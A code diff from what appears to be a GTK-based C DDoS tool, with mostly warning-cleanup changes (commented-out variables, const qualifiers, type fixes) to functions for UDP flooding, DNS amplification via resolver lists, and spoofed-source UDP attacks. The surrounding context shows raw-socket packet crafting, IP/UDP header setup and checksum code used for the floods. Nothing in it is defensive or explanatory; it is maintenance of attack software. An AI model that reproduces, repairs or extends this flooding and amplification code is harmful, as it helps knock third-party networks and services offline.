@@ -112,7 +112,7 @@ void cb_udp_ddos_script_2(GtkButton *button, gpointer user_data)
 {
     GtkWidget *run_script_dialog = NULL;
     GtkWidget *script_command_entry = NULL;
-    const gchar *script_command = NULL;
+    //const gchar *script_command = NULL;
     gchar *logs_msg = NULL;             // ????????? SERT A QUOI ?????????
 
     GtkTextBuffer *text_buffer = NULL;
@@ -407,7 +407,7 @@ uint32_t rand_cmwc_power(void)
     return (Q[i] = r - x);
 }
 
-char *myStrCat(char *s, char *a)
+char *myStrCat(char *s, const char *a)
 {
     while (*s != '\0') s++;
     while (*a != '\0') *s++ = *a++;
@@ -417,7 +417,7 @@ char *myStrCat(char *s, char *a)
     return s;
 }
 
-char *replStr(char *str, size_t count)
+char *replStr(const char *str, size_t count)
 {
     if (count == 0) return NULL;
 
@@ -525,7 +525,7 @@ void *flood_power(void *par1)
     struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
     struct sockaddr_in sin = td->sin;
 
-    char new_ip[sizeof "255.255.255.255"];
+    //char new_ip[sizeof "255.255.255.255"];
 
     int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
     if(s < 0)
@@ -534,7 +534,8 @@ void *flood_power(void *par1)
         exit(-1);
     }
 
-    unsigned int floodport = td->floodport;
+    //unsigned int floodport = td->floodport;
+    floodport = td->floodport;
 
     // Clear the data
     memset(datagram, 0, MAX_PACKET_SIZE);
@@ -543,8 +544,8 @@ void *flood_power(void *par1)
     setup_ip_header_power(iph);
     setup_udp_header_power(udph);
 
-    char *data = (char *)udph + sizeof(struct udphdr);
-    data = replStr("\xFF", td->pks);
+    //char *data = (char *)udph + sizeof(struct udphdr);    /** ATTENTION A CETTE MISE EN COMMENTAIRE     **/
+    //data = replStr("\xFF", td->pks);
     udph->len = htons(td->pks);
 
     iph->tot_len += td->pks;
@@ -566,7 +567,7 @@ void *flood_power(void *par1)
     int throttle = td->throttle;
 
     uint32_t random_num;
-    uint32_t ul_dst;
+    //uint32_t ul_dst;
     init_rand(time(NULL));
     if(throttle == 0)
     {
@@ -593,8 +594,6 @@ void *flood_power(void *par1)
 
         }
     }
-
-    return;
 }
 
 /** general functions **/
@@ -664,7 +663,7 @@ unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
         unsigned short length;
     } pseudohead;
 
-    unsigned short total_len = iph->tot_len;
+    //unsigned short total_len = iph->tot_len;
     pseudohead.src_addr = iph->saddr;
     pseudohead.dst_addr = iph->daddr;
     pseudohead.zero = 0;
@@ -1373,8 +1372,8 @@ void cb_dns_amped_ddos(void)
     char *strLine = (char *) malloc(256);
     strLine = memset(strLine, 0x00, 256);
 
-    char strIP[32] = "";
-    char strDomain[256] = "";
+    //char strIP[32] = "";
+    //char strDomain[256] = "";
 
     int iLine = 0;
 
@@ -1410,7 +1409,7 @@ void cb_dns_amped_ddos(void)
         pthread_create( &thread[i], NULL, &flood_dns, (void *) &td[i]);
     }
 
-    wait_time_end(atof(time_duration));
+    wait_time_end(atoi(time_duration));
 
     gtk_widget_destroy(IP_dialog);
     gtk_widget_destroy(port_dialog);
@@ -1425,9 +1424,10 @@ void cb_dns_amped_ddos(void)
 
 }
 
-void ChangetoDnsNameFormat(unsigned char* dns,unsigned char* host)
+void ChangetoDnsNameFormat(unsigned char* dns, unsigned char* host)
 {
-    int lock = 0 , i;
+    size_t lock = 0;
+    size_t i = 0;
     strcat((char*)host,".");
 
     for(i = 0 ; i < strlen((char*)host) ; i++)
@@ -1551,7 +1551,7 @@ void *flood_dns(void *par1)
     iph->check = csum_dns((unsigned short *) strPacket, iph->tot_len >> 1);
 
 
-    char strDomain[256];
+    unsigned char strDomain[256];
     int i;
     int iAdditionalSize = 0;
 
@@ -1566,7 +1566,7 @@ void *flood_dns(void *par1)
         unsigned char *qname = (unsigned char*) &strPacket[iPayloadSize + iAdditionalSize];
 
         strcpy(strDomain, list_node->domain);
-        ChangetoDnsNameFormat(qname, strDomain);
+        ChangetoDnsNameFormat(qname, strDomain);            /*** IIIIIIIIIIIICIIIIIIII ***/
 
         iAdditionalSize += strlen(qname) + 1;
 
@@ -1603,8 +1603,8 @@ void ParseResolverLine(char *strLine, int iLine)
     char caIP[32] = "";
     char caDNS[512] = "";
 
-    int i;
-    char buffer[512] = "";
+    size_t i;
+    //char buffer[512] = "";
 
     int moved = 0;
 
@@ -1809,7 +1809,7 @@ void cb_udp_spoofed(void)
 	if (pFile == NULL)
 	{
 		printf("[X] Cannot open file\n");
-		return -1;
+		return;
 	}
 
 	while (!feof(pFile))
@@ -1862,7 +1862,7 @@ void attack(unsigned long srcip, int srcport, unsigned long destip, int destport
 	struct udphdr *udph = (struct udphdr *) (packet + sizeof(struct ip));
 
     struct sockaddr_in sin;
-    struct pseudo_header psh;
+    //struct pseudo_header psh;
 
     sin.sin_family = AF_INET;
     sin.sin_port = htons(destport);
@@ -1906,7 +1906,7 @@ void attack(unsigned long srcip, int srcport, unsigned long destip, int destport
 }
 
 
-void *thread_attack(void *thread_params, const gchar *port_number_spoof)
+void *thread_attack(void *thread_params)
 {
 	struct pthread_param *params = thread_params;
 	int i;
@@ -1920,14 +1920,14 @@ char *getLine(FILE *f)
 {
 	char *buffer = malloc(sizeof(char));
 	int pos = 0;
-	char c;
+	char c_line;
 
 	do
 	{
-        c = fgetc(f);
-		if(c != EOF) buffer[pos++] = (char)c;
+        c_line = fgetc(f);
+		if(c_line != EOF) buffer[pos++] = (char)c_line;
 		buffer = (char*)realloc(buffer, sizeof(char) * (pos + 2));
-	}while (c != EOF && c != '\n');
+	}while (c_line != EOF && c_line != '\n');
 
 	return buffer;
 }
